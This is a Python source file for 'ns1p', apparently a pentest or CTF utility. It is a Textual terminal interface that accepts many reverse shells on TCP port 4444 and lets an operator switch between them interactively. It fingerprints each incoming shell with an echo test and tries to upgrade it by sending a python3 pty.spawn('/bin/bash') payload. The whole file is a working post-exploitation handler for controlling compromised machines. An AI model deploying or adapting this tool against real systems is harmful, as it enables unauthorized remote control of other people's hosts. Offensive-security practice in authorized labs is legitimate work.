#!/usr/bin/env python3

import sys
import termios
import tty
import select

import collections
import asyncio

import textual
from textual import events
from textual.app import App, ComposeResult
from textual.widgets import Static, ListView, ListItem, Label, RichLog

class ShellSession:
    def __init__(self, session_id, name, reader, writer):
        self.session_id = session_id
        self.name = name
        self.reader = reader
        self.writer = writer
        self.read_deque = collections.deque()

class NShellsOnePortApp(App):
    """Accepts N reverse shell on one tcp port"""

    def compose(self) -> ComposeResult:
        self.session_list = []
        self.session_list_view = None
        self.next_session_id = 0
        self.write_lock = asyncio.Lock()

        yield Static("Welcome to ns1p - N Shells 1 Port")

        self.session_list_view = ListView()
        yield self.session_list_view

        self.log_view = RichLog(highlight=True, markup=True, wrap=True)
        yield self.log_view

    async def on_list_view_selected(self, event: ListView.Selected):
        session_id = int(event.item.id.split('session_')[1])
        session = next(s for s in self.session_list if s.session_id == session_id)
        self.log_view.write(f"Selected session {session_id}: {session.name}")
        with self.suspend(), RawStdin():
            def console_data_loop():

                def stdin_has_data():
                    return select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], [])

                menu = False

                # TODO: implement a history function

                while not menu and session in self.session_list:
                    while True:
                        try:
                            data = session.read_deque.popleft()
                            data = data.replace(b'\n', b'\r\n')
                            sys.stdout.buffer.write(data)
                            sys.stdout.buffer.flush()
                        except IndexError:
                            break
                    if stdin_has_data():
                        b = sys.stdin.buffer.read(1)
                        if b ==  b'\x02': #STX aka Ctrl-B
                            menu = True
                        else:
                            session.writer.write(b)
            await asyncio.get_running_loop().run_in_executor(None, console_data_loop)

    async def on_ready(self) -> None:
        self.run_worker(self.master_server())

    async def update_session_list_view(self) -> None:
        async with self.write_lock:
            await self.session_list_view.clear()
            self.session_list_view.extend([ListItem(Label(s.name), id=f"session_{s.session_id}") for s in self.session_list])

    async def rshell_client(self, reader, writer) -> None:
        # errors here are silenced somehow so we need to catch them ourselves
        try:
            addr = writer.get_extra_info('peername')
            async with self.write_lock:
                session_id = self.next_session_id
                self.next_session_id += 1
                session_name = f"{session_id}: {addr}"
                session = ShellSession(session_id, session_name, reader, writer)
                self.session_list.append(session)
            await self.update_session_list_view()
            self.log_view.write(f"[*] new session {session_name}")
    
            async def shell_feature_check():
                writer.write(b"\n\n\n")
                await writer.drain()
                # read any potentially remaining data (banner, leftover command output)
                try:
                    await asyncio.wait_for(reader.read(), timeout=3)
                except TimeoutError:
                    pass

                writer.write(b"echo ns1p\n")
                await writer.drain()
                stdin_echo = False
                command_echo = False
                data = None
                try:
                    data = await asyncio.wait_for(reader.readline(), timeout=1)
                    data += await asyncio.wait_for(reader.readline(), timeout=1)
                except TimeoutError:
                    pass

                if not data:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with empty response data)")
                elif b"ns1p" in data and not b"echo ns1p" in data:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo command but doesn't echo inputs")
                    command_echo = True
                elif b"echo ns1p" in data and data.count(b"ns1p") == 2:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo and echos inputs")
                    stdin_echo = True
                    command_echo = True
                else:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data)")

                return (stdin_echo, command_echo)

            (stdin_echo, command_echo) = await shell_feature_check()
            if command_echo and not stdin_echo:
                self.log_view.write(f"[*] Session {session_id}: Attempting auto-stabilization using linux python3 payload")
                writer.write(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
                await writer.drain()
                (stdin_echo, command_echo) = await shell_feature_check()
            # TODO: have some kind of readline mode

            while True:
                data = await reader.read(1024)
                if not data:
                    break
                session.read_deque.append(data)
                #self.log_view.write(f"Received: {data.decode()}")
        
            self.log_view.write(f"[*] session {session_name} closed")
            writer.close()
            await writer.wait_closed()
            async with self.write_lock:
                self.session_list.remove(session)
            await self.update_session_list_view()
            self.log_view.write(f"[*] session {session_name} removed")

        except Exception as e:
            self.log_view.write(f"[-] Exception in rshell_client {e}")
    
    async def master_server(self, host='0.0.0.0', port=4444):
        server = await asyncio.start_server(self.rshell_client, host, port)
        addr = server.sockets[0].getsockname()
        self.log_view.write(f"[*] Listening on {addr}")
        async with server:
            await server.serve_forever()

class RawStdin:
    def __enter__(self):
        self.fd = sys.stdin.fileno()
        self.old_attributes = termios.tcgetattr(self.fd)

        new_attributes = termios.tcgetattr(self.fd)
        tty.cfmakeraw(new_attributes) #do we even want raw mode or just ignore signals?
        #new_attributes[0] = new_attributes[0] & ~termios.INLCR
        new_attributes[0] = new_attributes[0] | termios.ICRNL
        #new_attributes[3] = new_attributes[3] | termios.ECHO
        #new_attributes[3] = new_attributes[3] & ~termios.ISIG
        termios.tcsetattr(self.fd, termios.TCSANOW, new_attributes)

    def __exit__(self, exc_type, exc_val, exc_tb):
        termios.tcsetattr(self.fd, termios.TCSANOW, self.old_attributes)

if __name__ == '__main__':
    NShellsOnePortApp().run()


